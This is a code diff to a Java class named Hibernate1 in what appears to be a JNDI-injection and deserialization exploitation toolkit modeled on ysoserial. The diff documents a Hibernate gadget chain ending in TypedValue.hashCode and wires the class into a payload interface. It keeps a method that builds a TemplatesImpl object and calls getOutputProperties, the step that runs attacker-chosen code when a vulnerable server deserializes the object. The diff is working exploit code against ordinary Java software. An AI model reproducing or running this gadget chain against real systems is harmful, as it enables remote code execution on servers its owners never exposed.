@@ -2,6 +2,7 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import org.hibernate.EntityMode;
 import org.hibernate.engine.spi.TypedValue;
@@ -20,7 +21,26 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Hibernate1 {
+/**
+ * org.hibernate.property.access.spi.GetterMethodImpl.get()
+ * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
+ * org.hibernate.type.ComponentType.getPropertyValue(C)
+ * org.hibernate.type.ComponentType.getHashCode()
+ * org.hibernate.engine.spi.TypedValue$1.initialize()
+ * org.hibernate.engine.spi.TypedValue$1.initialize()
+ * org.hibernate.internal.util.ValueHolder.getValue()
+ * org.hibernate.engine.spi.TypedValue.hashCode()
+ *
+ *  Requires:
+ *  - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
+ *
+ *  @author mbechler
+ */
+public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAtLeast(7);
+    }
 
     public static String[] getDependencies() {
         if (System.getProperty("hibernate5") != null) {
@@ -79,10 +99,15 @@ public class Hibernate1 {
     }
 
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return (byte[]) makeCaller(tpl, getters);
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 
 
